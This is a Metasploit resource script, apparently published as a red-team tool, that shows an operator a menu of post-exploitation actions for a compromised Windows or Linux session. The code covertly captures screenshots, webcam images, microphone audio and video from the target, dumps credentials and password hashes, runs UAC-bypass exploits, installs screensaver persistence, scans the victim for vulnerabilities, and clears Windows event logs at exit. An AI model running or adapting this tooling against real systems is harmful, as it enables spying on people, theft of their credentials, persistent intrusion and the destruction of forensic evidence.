<ruby>
   help = %Q|

    Description:
      Resource File to assiste in session post_exploitation tasks.
      This script displays a menu of commands based on session platform (windows/linux).
      It also querys the database for session Id to be able to run post-modules againts it.
      'This script can NOT be run in meterpreter prompt because ERB code its not accepted'
      'if none value (setg) has povided then this script will use is own default values'

    Execute in msfconsole:
       setg REC_TIME <record-time-in-seconds>
       setg MSF_PATH <absoluct-path-to-metasploit>
       resource <path-to-script>/post_exploitation.rc

    Author:
       r00t-3xp10it  <pedroubuntu10[at]gmail.com>

   |
   ## timeout to record audio/vid from target (sec)
   if (framework.datastore['REC_TIME'] == nil or framework.datastore['REC_TIME'] == '')
      run_single("setg REC_TIME 10")
   end
   print_line(help)
   Rex::sleep(2.0)


      user_input=''
      path_input=''
      timeout_input=''
      ## Make sure we have any sessions active before continue
      unless (framework.sessions.length > 0)
         print_error("[ERROR] No active sessions found in database.")
         Rex::sleep(1.0)
         run_single("sessions")
         ss_help = %Q|

    This resource script requires one 'open session' active to be able to
    display to attacker a post-exploitation menu based on target platform.
    'So.. Exploit one target (open session) before playing with this script'

         |
         print_line(ss_help)
         run_single("back")
         return nil
      end


     ## Store session ID (last active)
     framework.sessions.each_key do |sid|
         session = framework.sessions[sid]
         ## Store RHOST (xhost) and RPORT (xport)
         xhost = session.tunnel_peer.split(':')[0]
         xport = session.tunnel_peer.split(':')[1]

      ## Sellect resource file MENU based on session.platform
      if (session.platform =~ /Windows/i)
      run_single("sessions")
      win = %Q|
  Command        Description                platform
  -------        -----------                --------      
  workspace      Work in redteam database   multi
  record         Record session activity    multi
  rec_target     Record target activity     Windows
  gather         Run post gather modules    Windows
  creds          Run credentials modules    Windows
  resource       Run command list rc file   Windows
  persistence    Run MITRE ATT&CK T1180     Windows
  bypass_uac     Run bypass UAC modules     Windows
  play_youtube   Spawn video (remote PC)    Windows
  cve_suggest    Run exploit_suggester      multi
  exit           Exit post_exploitation     multi

      |
      print_line(win)
      Rex::sleep(0.5)
      print "[Command]: "
         user_input = gets.chomp
         ## set global var session ID
         run_single("setg SESSION #{sid}")


         Rex::sleep(1.0)
         ## Work in redteam workspace db
         if user_input == "workspace"
            print_good("Building new workspace database") 
            Rex::sleep(1.0)
            print "[+] Input workspace name to create: "
               wk_name = gets.chomp
            run_single("workspace -a #{wk_name}")
            print_line("")
            run_single("workspace -v")
            print_line("")
            Rex::sleep(1.0)
            print_line("REMARK")
            print_line("======")
            print_line("  All session data will be stored in *#{wk_name} workspace")
            print_line("  'To delete workspace: workspace -d #{wk_name}'")
            print_line("")
            print_line("")
            run_single("unsetg all")
         ## Function to record session activity
         elsif user_input == "record"
            print_status("Recording msfconsole activity.")
            rand = Rex::Text.rand_text_alpha(5)
            local = Dir.pwd
            Rex::sleep(1.0)
            run_single("spool post_#{rand}.log")
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            print_line("")
            run_single("sessions -v")
            print_line("REMARK")
            print_line("======")
            print_line("  Logfile its beeing written in: #{local}/post_#{rand}.log")
            print_line("  'And it only stops recording when we exit msfconsole'")
            print_line("")
            print_line("")
            run_single("unsetg all")
         ## Function to record target system activity
         elsif user_input == "rec_target"
            print_status("Recording target activity.")
            Rex::sleep(1.0)
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("sessions -C webcam_list -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            tar = %Q|

    This function records target activity using meterpreter scripts:
        'screenshot : webcam_snap : record_mic : webcam_stream'

    setg REC_TIME <record-time-in-seconds> (before run this script)
                   press < CTRL+C > to abort function(s)

            |
            print_line(tar)
            print "[+] Take a screenshot of remote desktop? (y/n): "
            question = gets.chomp
            if question == "y" or question == "Y" or question == "yes" or question == "YES"
               run_single("sessions -C screenshot -i #{framework.datastore['SESSION']}")
               Rex::sleep(1.0)
            end
            print "[+] Take a foto using remote camera? (y/n): "
            question = gets.chomp
            if question == "y" or question == "Y" or question == "yes" or question == "YES"
               run_single("sessions -C webcam_snap -i #{framework.datastore['SESSION']}")
               Rex::sleep(1.0)
            end
            print "[+] Record audio from target microphone? (y/n): "
            question = gets.chomp
            if question == "y" or question == "Y" or question == "yes" or question == "YES"
               run_single("sessions -C \"record_mic -d #{framework.datastore['REC_TIME']}\" -i #{framework.datastore['SESSION']}")
               Rex::sleep(1.0)
            end
            print "[+] Record video from target camera? (y/n): "
            question = gets.chomp
            if question == "y" or question == "Y" or question == "yes" or question == "YES"
               run_single("sessions -C \"webcam_stream -d #{framework.datastore['REC_TIME']}\" -i #{framework.datastore['SESSION']}")
            end
            run_single("unsetg all")
         ## Function to run msf gather modules
         elsif user_input == "gather"
            print_status("Running post gather modules.")
            Rex::sleep(1.0)
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("sessions -C sysinfo -i #{framework.datastore['SESSION']}")
            run_single("sessions -C getuid -i #{framework.datastore['SESSION']}")
            run_single("use post/windows/gather/checkvm")
            run_single("run")
            run_single("use post/multi/gather/wlan_geolocate")
            run_single("run")
            Rex::sleep(1.5)
            run_single("use post/windows/gather/enum_shares")
            run_single("run")
            run_single("use post/windows/gather/enum_logged_on_users")
            run_single("run")
            run_single("use post/windows/gather/enum_computers")
            run_single("run")
            run_single("use post/windows/gather/enum_applications")
            run_single("run")
            run_single("sessions -C enumdesktops -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("sessions -C show_mount -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            ## Metasploit framework absoluct path setg variable declaration (user input?)
            if (framework.datastore['MSF_PATH'] == nil or framework.datastore['MSF_PATH'] == '')
               run_single("setg MSF_PATH /usr/share/metasploit-framework")
            end
            ## Make sure that enum_protections.rb exists (msfdb)
            aV_recon = "#{framework.datastore['MSF_PATH']}/modules/post/windows/recon/enum_protections.rb"
            unless (File.exist?(aV_recon))
               print_error("[ERROR] enum_protections not found in msfdb")
               print_error("[ERROR] Download post-module and install it before running this option")
               Rex::sleep(1.5)
               nof = %Q|

    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/enum_protections.rb
    path=$(locate modules/post/windows/recon \| grep -v '\\doc' \| grep -v '\\documentation' \| head -n 1)
    sudo cp enum_protections.rb $path/enum_protections.rb
    sudo msfconsole -q -x 'db_status;reload_all'

               |
               print_line(nof)
               print_status("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
               return nil
          else
               print_good("enum_protections post-module found.")
               Rex::sleep(1.0)
          end
            run_single("use post/windows/recon/enum_protections")
            run_single("set BANNER false")
            run_single("run")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run msf creds modules
         elsif user_input == "creds"
            print_status("Running post creds modules.")
            Rex::sleep(1.0)
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("use post/windows/gather/credentials/windows_autologin")
            run_single("run")
            run_single("use post/multi/gather/pidgin_cred")
            run_single("run")
            run_single("use post/windows/gather/credentials/outlook")
            run_single("run")
            run_single("use post/windows/gather/credentials/mremote")
            run_single("run")
            run_single("use post/multi/gather/firefox_creds")
            run_single("run")
            run_single("sessions -C getsystem -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("use post/windows/gather/lsa_secrets")
            run_single("run")
            run_single("use post/windows/gather/smart_hashdump")
            run_single("run")
            run_single("use post/windows/gather/enum_patches")
            run_single("run")
            run_single("unsetg all")
         ## Function to run multi console commands list (rc file)
         elsif user_input == "resource"
            print_status("Running list of console commands (rc file)") 
            Rex::sleep(1.0)
            rc_help = %Q|

    This function allow users to run a list of console/meterpreter
    core commands present inside a local file (one-per-line-entrys)

            |
            print_line(rc_help)
            print "[+] Absoluct path of rc file to run (local): "
            f_path = gets.chomp
            unless (File.exist?(f_path))
               print_error("[ERROR] resource file not found in local PC")
               print_error("[ERROR] PATH: #{f_path}")
               Rex::sleep(1.5)
               return nil
            end
            run_single("use post/multi/gather/run_console_rc_file")
            run_single("set RESOURCE #{f_path}")
            run_single("run")
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run T1180 persistence module
         elsif user_input == "persistence"
            print_status("Running post persistence module.")
            Rex::sleep(1.0)
               print_warning("Use double backslash(s) to define windows paths.")
               print "[+] Absoluct path of payload (remote): "
               bin_path = gets.chomp
            ## Metasploit framework absoluct path setg variable declaration (user input?)
            if (framework.datastore['MSF_PATH'] == nil or framework.datastore['MSF_PATH'] == '')
               run_single("setg MSF_PATH /usr/share/metasploit-framework")
            end
            ## Make sure that SCRNSAVE_T1180_persistence.rb exists (msfdb)
            t1180_recon = "#{framework.datastore['MSF_PATH']}/modules/post/windows/escalate/SCRNSAVE_T1180_persistence.rb"
            unless (File.exist?(t1180_recon))
               print_error("[ERROR] SCRNSAVE_T1180_persistence not found in msfdb")
               print_error("[ERROR] Download post-module and install it before running this option")
               Rex::sleep(1.5)
               nof = %Q|

    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/SCRNSAVE_T1180_persistence.rb
    path=$(locate modules/post/windows/escalate \| grep -v '\\doc' \| grep -v '\\documentation' \| head -n 1)
    sudo cp SCRNSAVE_T1180_persistence.rb $path/SCRNSAVE_T1180_persistence.rb
    sudo msfconsole -q -x 'db_status;reload_all'

               |
               print_line(nof)
               print_status("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
               return nil
          else
               print_good("SCRNSAVE_T1180_persistence post-module found.")
               Rex::sleep(0.5)
          end
            run_single("use post/windows/escalate/SCRNSAVE_T1180_persistence")
            run_single("set APPL_PATH #{bin_path}")
            run_single("run")
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run various bypass uac modules
         elsif user_input == "bypass_uac"
            print_status("Bypass UAC (privilege escalation)")
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            by_uac = %Q|

  Command        Module Name
  -------        -----------    
  bypassuac      exploit/windows/local/bypassuac
  eventvwr       exploit/windows/local/bypassuac_eventvwr
  fodhelper      exploit/windows/local/bypassuac_fodhelper
  comhijack      exploit/windows/local/bypassuac_comhijack
  sluihijack     exploit/windows/local/bypassuac_sluihijack

            |
            print_line(by_uac)
            Rex::sleep(0.5)
            print "[Command]: "
               user_uac = gets.chomp

            ## Run msf post-modules
            if user_uac == "bypassuac"
               run_single("use exploit/windows/local/bypassuac")
               run_single("set SESSION #{framework.datastore['SESSION']}")
               run_single("exploit")
            elsif user_uac == "eventvwr"
               run_single("use exploit/windows/local/bypassuac_eventvwr")
               run_single("set SESSION #{framework.datastore['SESSION']}")
               run_single("exploit")
            elsif user_uac == "fodhelper"
               run_single("use exploit/windows/local/bypassuac_fodhelper")
               run_single("set SESSION #{framework.datastore['SESSION']}")
               run_single("exploit")
            elsif user_uac == "comhijack"
               run_single("use exploit/windows/local/bypassuac_comhijack")
               run_single("set SESSION #{framework.datastore['SESSION']}")
               run_single("exploit")
            elsif user_uac == "sluihijack"
               run_single("use exploit/windows/local/bypassuac_sluihijack")
               run_single("set SESSION #{framework.datastore['SESSION']}")
               run_single("exploit")
            else
               print_error("[ABORT] Command not supported: #{user_uac}")
               Rex::sleep(1.0)
               run_single("unsetg all")
               return nil
            end
         ## Function to spawn youtube video remote
         elsif user_input == "play_youtube"
            print_status("Spawning remote video.")
            Rex::sleep(1.0)
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            you_help = %Q|

    Description
    -----------
    This module spawn a youtube video on remote machine.
    IF none value its inputed then this module will use
    the default youtube url video < 35Yq7ae6F8E >

    How To Use youtube urls
    -----------------------
    https://www.youtube.com/watch?v=35Yq7ae6F8E
    we just need to extract the url after: watch?v=

            |
            print_line(you_help)
            print "[+] Input youtube URL: "
               youtube_url = gets.chomp
               if youtube_url.nil? or youtube_url == '' or youtube_url == ' '
                  youtube_url = "35Yq7ae6F8E"
               end
            run_single("use post/multi/manage/play_youtube")
            run_single("set SESSION #{framework.datastore['SESSION']}")
            run_single("set VID #{youtube_url}")
            run_single("run")
            run_single("unsetg all")
         ## Function to run local_exploit_suggester (multi platforms)
         elsif user_input == "cve_suggest"
            print_status("Running local_exploit_suggester module.")
            Rex::sleep(1.0)
            run_single("use post/multi/recon/local_exploit_suggester")
            run_single("run")
            print_status("Running freevulnsearch.nse module.")
            Rex::sleep(1.0)
            nse = "/usr/share/nmap/scripts/freevulnsearch.nse"
            unless (File.exist?(nse))
                 print_error("[ERROR] freevulnsearch.nse script not found in nmap db.")
                 print_error("[ERROR] Download nse script and install it before running this rc file.")
                 Rex::sleep(1.0)
            nof = %Q|

    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
    sudo nmap --script-updatedb

           |
           print_line(nof)
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              return nil
            else
              print_good("freevulnsearch.nse script found.")
              Rex::sleep(0.5)
            end
            ## running freevulnsearch.nse againts xhost
            print_warning("Running CVE checks againts: #{xhost}")
            Rex::sleep(1.0)
            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse #{xhost}")
            run_single("unsetg all")
         ## Function to exit 'windows' platform menu
         elsif user_input == "exit" or user_input == "e" or user_input == "E"
            run_single("unsetg all")
            run_single("back")
            return nil
         else
            ## User input error - wrong command input
            print_error("[ABORT] Command not supported: #{user_input}")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("back")
            return nil
         end


      ## Sellect resource file menu based on session.platform
      elsif (session.platform =~ /Linux/i)
      run_single("sessions")
      lin = %Q|
  Command       Description                platform
  -------       -----------                --------
  workspace     Work in redteam database   multi
  record        Record session activity    multi
  rec_target    Record target activity     Linux
  gather        Run post gather modules    Linux
  creds         Run credentials modules    Linux
  agressive     Run agressive gather       Linux
  resource      Run command list rc file   Linux
  cve_suggest   Run exploit_suggester      multi
  exit          Exit post_exploitation     multi

      |
      print_line(lin)
      Rex::sleep(0.5)
      print "[Command]: "
         user_input = gets.chomp
         ## set global var session ID
         run_single("setg SESSION #{sid}")


         ## Metasploit framework absoluct path setg variable declaration (user input?)
         if (framework.datastore['MSF_PATH'] == nil or framework.datastore['MSF_PATH'] == '')
            run_single("setg MSF_PATH /usr/share/metasploit-framework")
         end

         ## Work in redteam workspace db
         if user_input == "workspace"
            print_good("Building new workspace database") 
            Rex::sleep(1.0)
            print "[+] Input workspace name to create: "
               wk_name = gets.chomp
            run_single("workspace -a #{wk_name}")
            print_line("")
            run_single("workspace -v")
            print_line("")
            Rex::sleep(1.0)
            print_line("REMARK")
            print_line("======")
            print_line("  All session data will be stored in *#{wk_name} workspace")
            print_line("  'To delete workspace: workspace -d #{wk_name}'")
            print_line("")
            print_line("")
            run_single("unsetg all")
         ## Function to record session activity
         elsif user_input == "record"
            print_status("Recording msfconsole activity.")
            rand = Rex::Text.rand_text_alpha(5)
            local = Dir.pwd
            Rex::sleep(1.0)
            run_single("spool post_#{rand}.log")
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            print_line("")
            print_line("REMARK")
            print_line("======")
            print_line("  Logfile its beeing written in: #{local}/post_#{rand}.log")
            print_line("  'And it only stops recording when we exit msfconsole'")
            print_line("")
            print_line("")
            run_single("unsetg all")
         ## Function to record target system activity
         elsif user_input == "rec_target"
            print_status("Recording target activity.")
            Rex::sleep(1.0)
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("sessions -C webcam_list -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            tar = %Q|

    This function records target activity using meterpreter scripts:
           'webcam_snap : mic_list : mic_start : webcam_stream'

    setg REC_TIME <record-time-in-seconds> (before run this script)
                   press < CTRL+C > to abort function(s)

            |
            print_line(tar)
            print "[+] Take a foto using remote camera? (y/n): "
            question = gets.chomp
            if question == "y" or question == "Y" or question == "yes" or question == "YES"
               run_single("sessions -C webcam_snap -i #{framework.datastore['SESSION']}")
               Rex::sleep(1.0)
            end
            print "[+] Record audio from target microphone? (y/n): "
            question = gets.chomp
            if question == "y" or question == "Y" or question == "yes" or question == "YES"
               run_single("sessions -C mic_list -i #{framework.datastore['SESSION']}")
               run_single("sessions -C \"mic_start -d #{framework.datastore['REC_TIME']}\" -i #{framework.datastore['SESSION']}")
               Rex::sleep(1.0)
            end
            print "[+] Record video from target camera? (y/n): "
            question = gets.chomp
            if question == "y" or question == "Y" or question == "yes" or question == "YES"
               run_single("sessions -C \"webcam_stream -d #{framework.datastore['REC_TIME']}\" -i #{framework.datastore['SESSION']}")
            end
            run_single("unsetg all")
         ## Function to run msf gather modules
         elsif user_input == "gather"
            print_status("Running post gather modules.")
            Rex::sleep(1.0)
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("sessions -C sysinfo -i #{framework.datastore['SESSION']}")
            run_single("sessions -C getuid -i #{framework.datastore['SESSION']}")
            run_single("sessions -C webcam_list -i #{framework.datastore['SESSION']}")
            Rex::sleep(1.0)
            run_single("use post/multi/gather/enum_vbox")
            run_single("run")
            run_single("use post/multi/gather/wlan_geolocate")
            run_single("run")
            Rex::sleep(1.5)
            ## Make sure that linux_hostrecon.rb exists (msfdb)
            linux_recon = "#{framework.datastore['MSF_PATH']}/modules/post/linux/gather/linux_hostrecon.rb"
            unless (File.exist?(linux_recon))
               print_error("[ERROR] linux_hostrecon.rb not found in msfdb")
               print_error("[ERROR] Download post-module and install it before running this option")
               Rex::sleep(1.5)
               nof = %Q|

    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/linux_hostrecon.rb
    path=$(locate modules/post/linux/gather \| grep -v '\\doc' \| grep -v '\\documentation' \| head -n 1)
    sudo cp linux_hostrecon.rb $path/linux_hostrecon.rb
    sudo msfconsole -q -x 'db_status;reload_all'

               |
               print_line(nof)
               print_status("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
               return nil
          else
               print_good("linux_hostrecon.rb post-module found.")
               Rex::sleep(0.5)
          end
            run_single("use post/linux/gather/linux_hostrecon")
            run_single("run")
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run msf creds modules
         elsif user_input == "creds"
            print_status("Running post creds modules.")
            Rex::sleep(1.0)
            run_single("use post/linux/gather/enum_psk")
            run_single("run")
            run_single("use post/multi/gather/firefox_creds")
            run_single("run")
            ## Make sure that linux_hostrecon.rb exists (msfdb)
            linux_recon = "#{framework.datastore['MSF_PATH']}/modules/post/linux/gather/linux_hostrecon.rb"
            unless (File.exist?(linux_recon))
               print_error("[ERROR] linux_hostrecon.rb not found in msfdb")
               print_error("[ERROR] Download post-module and install it before running this option")
               Rex::sleep(1.5)

               nof = %Q|
    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/linux_hostrecon.rb
    path=$(locate modules/post/linux/gather \| grep -v '\\doc' \| grep -v '\\documentation' \| head -n 1)
    sudo cp linux_hostrecon.rb $path/linux_hostrecon.rb
    sudo msfconsole -q -x 'db_status;reload_all'

               |
               print_line(nof)
               print_status("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
               return nil
          else
               print_good("linux_hostrecon.rb post-module found.")
               Rex::sleep(0.5)
          end
            run_single("use post/linux/gather/linux_hostrecon")
            run_single("set CREDENTIALS_DUMP true")
            run_single("run")
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run agressive module
         elsif user_input == "agressive"
            print_status("Running post agressive gather modules.")
            Rex::sleep(1.0)
            ## Make sure that linux_hostrecon.rb exists (msfdb)
            linux_recon = "#{framework.datastore['MSF_PATH']}/modules/post/linux/gather/linux_hostrecon.rb"
            unless (File.exist?(linux_recon))
               print_error("[ERROR] linux_hostrecon.rb not found in msfdb")
               print_error("[ERROR] Download post-module and install it before running this option")
               Rex::sleep(1.5)

               nof = %Q|
    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/linux_hostrecon.rb
    path=$(locate modules/post/linux/gather \| grep -v '\\doc' \| grep -v '\\documentation' \| head -n 1)
    sudo cp linux_hostrecon.rb $path/linux_hostrecon.rb
    sudo msfconsole -q -x 'db_status;reload_all'

               |
               print_line(nof)
               print_status("Please wait, cleaning recent configurations.")
               Rex::sleep(1.0)
               run_single("unsetg all")
               return nil
          else
               print_good("linux_hostrecon.rb post-module found.")
               Rex::sleep(0.5)
          end
            run_single("use post/linux/gather/linux_hostrecon")
            run_single("set AGRESSIVE_DUMP true")
            run_single("run")
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run multi console commands list (rc file)
         elsif user_input == "resource"
            print_status("Running list of console commands (rc file)") 
            Rex::sleep(1.0)
            rc_help = %Q|

    This function allow users to run a list of console/meterpreter
    core commands present inside a local file (one-per-line-entries)

            |
            print_line(rc_help)
            print "[+] Absoluct path of rc file to run (local): "
            f_path = gets.chomp
            unless (File.exist?(f_path))
               print_error("[ERROR] resource file not foundin local PC")
               print_error("[ERROR] PATH: #{f_path}")
               Rex::sleep(1.5)
               return nil
            end
            run_single("use post/multi/gather/run_console_rc_file")
            run_single("set RESOURCE #{f_path}")
            run_single("run")
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run local_exploit_suggester (multi platforms)
         elsif user_input == "cve_suggest"
            print_status("Running local_exploit_suggester module.")
            Rex::sleep(1.0)
            run_single("use post/multi/recon/local_exploit_suggester")
            run_single("run")
            print_status("Running freevulnsearch.nse module.")
            Rex::sleep(1.0)
            nse = "/usr/share/nmap/scripts/freevulnsearch.nse"
            unless (File.exist?(nse))
                 print_error("[ERROR] freevulnsearch.nse script not found in nmap db.")
                 print_error("[ERROR] Download nse script and install it before running this rc file.")
                 Rex::sleep(1.0)
            nof = %Q|

    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
    sudo nmap --script-updatedb

           |
           print_line(nof)
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              return nil
            else
              print_good("freevulnsearch.nse script found.")
            end
            ## running freevulnsearch.nse againts xhost
            print_warning("Running CVE checks againts: #{xhost}")
            Rex::sleep(1.0)
            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse #{xhost}")
            run_single("unsetg all")
         ## Function to exit 'linux' platform menu
         elsif user_input == "exit" or user_input == "e" or user_input == "E"
            run_single("unsetg all")
            run_single("back")
            return nil
         else
            ## User input error - wrong command input
            print_error("[ABORT] Command not supported: #{user_input}")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("back")
            return nil
         end


      ## Resource script cant find any platform in database
      else
      print_error("[ERROR] session platform: #{session.platform} not supported?")
      print_warning("Execute 'scan' command to scan for target platform?")
      Rex::sleep(1.5)
      print_status("Displaying only [multi] platform options.")
      Rex::sleep(1.5)
      print_line("")
      run_single("sessions")
      multi = %Q|
  Command       Description                platform      
  -------       -----------                --------
  scan          scan db_host for platform?
  workspace     Work in redteam database   multi
  record        Record session activity    multi
  gather        Run post gather modules    multi
  cve_suggest   Run exploit_suggester      multi
  exit          Exit post_exploitation     multi

      |
      print_line(multi)
      Rex::sleep(0.5)
      print "[Command]: "
         user_input = gets.chomp
         ## set global var session ID
         run_single("setg SESSION #{sid}")


         ## Work in redteam workspace db
         if user_input == "workspace"
            print_good("Building new workspace database") 
            Rex::sleep(1.0)
            print "[+] Input workspace name to create: "
               wk_name = gets.chomp
            run_single("workspace -a #{wk_name}")
            print_line("")
            run_single("workspace -v")
            print_line("")
            Rex::sleep(1.0)
            print_line("REMARK")
            print_line("======")
            print_line("  All session data will be stored in *#{wk_name} workspace")
            print_line("  'To delete workspace: workspace -d #{wk_name}'")
            print_line("")
            print_line("")
            run_single("unsetg all")
         ## Function to record session activity
         elsif user_input == "record"
            print_status("Recording msfconsole activity.")
            rand = Rex::Text.rand_text_alpha(5)
            local = Dir.pwd
            Rex::sleep(1.0)
            run_single("spool post_#{rand}.log")
            run_single("sessions -C localtime -i #{framework.datastore['SESSION']}")
            print_line("")
            print_line("REMARK")
            print_line("======")
            print_line("  Logfile its beeing written in: #{local}/post_#{rand}.log")
            print_line("  'And it only stops recording when we exit msfconsole'")
            print_line("")
            print_line("")
            run_single("unsetg all")
         ## Function to run multi platforms post module
         elsif user_input == "gather"
            print_status("Running multi platforms post modules.") 
            Rex::sleep(1.0)
            run_single("sessions -C sysinfo -i #{framework.datastore['SESSION']}")
            run_single("sessions -C webcam_list -i #{framework.datastore['SESSION']}")
            print_line("")
            Rex::sleep(1.0)
            run_single("use post/multi/gather/wlan_geolocate")
            run_single("run")
            Rex::sleep(1.5)
            run_single("use post/multi/gather/enum_vbox") 
            run_single("run")
            run_single("use post/multi/gather/env") 
            run_single("run")
            run_single("use post/multi/gather/firefox_creds")
            run_single("run")
            run_single("unsetg all")
            run_single("unset all")
         ## Function to scan for taget platform (os_name)
         elsif user_input == "scan"
            print_status("Please wait, trying to discover: #{xhost} platform")
            run_single("db_nmap -sV -Pn -T4 -O #{xhost}")
            run_single("hosts -C address,name,os_name,purpose")
            Rex::sleep(1.0)
            ## Check if we have a target platform now..
            framework.sessions.each_key do |x|
               session = framework.sessions[x]
                  unless (session.platform =~ /Windows/i or session.platform =~ /Linux/i)
                  ss_help = %Q|

    This resource script requires one open session active to be able to
    present to attackers a post-exploitation menu based on target platform.

                  |
                  print_line(ss_help)
                  else
                  print_good("session platform detected: #{session.platform}")
                  end
            print_line("")
            end
            run_single("unsetg all")
            run_single("unset all")
         ## Function to run local_exploit_suggester (multi platforms)
         elsif user_input == "cve_suggest"
            print_status("Running local_exploit_suggester module.")
            Rex::sleep(1.0)
            run_single("use post/multi/recon/local_exploit_suggester")
            run_single("run")
            print_status("Running freevulnsearch.nse module.")
            Rex::sleep(1.0)
            nse = "/usr/share/nmap/scripts/freevulnsearch.nse"
            unless (File.exist?(nse))
                 print_error("[ERROR] freevulnsearch.nse script not found in nmap db.")
                 print_error("[ERROR] Download nse script and install it before running this rc file.")
                 Rex::sleep(1.0)
            nof = %Q|

    How To Fix
    ----------
    Exit current session and msfconsole < exit -y >
    Then execute the follow commands in a new terminal windows:

    sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
    sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
    sudo nmap --script-updatedb

           |
           print_line(nof)
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              return nil
            else
              print_good("freevulnsearch.nse script found.")
            end
            ## running freevulnsearch.nse againts xhost
            xhost = framework.db.hosts.map(&:address).join(' ')
            print_warning("Running CVE checks againts: #{xhost}")
            Rex::sleep(1.0)
            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse #{xhost}")
            run_single("unsetg all")
         ## Function to exit 'multi' platform menu
         elsif user_input == "exit" or user_input == "e" or user_input == "E"
            run_single("unsetg all")
            run_single("back")
            return nil
         else
            ## User input error - wrong command input
            print_error("[ABORT] Command not supported: #{user_input}")
            Rex::sleep(1.0)
            run_single("unsetg all")
            run_single("back")
            return nil
         end
      end

   ## Prompt:: msf >
   run_single("back")
   if (session.platform =~ /Windows/ or session.platform =~ /windows/)
      print_line("")
      Rex::sleep(1.0)
      run_single("sessions -C clearev -i #{framework.datastore['SESSION']}")
   end
end
</ruby>

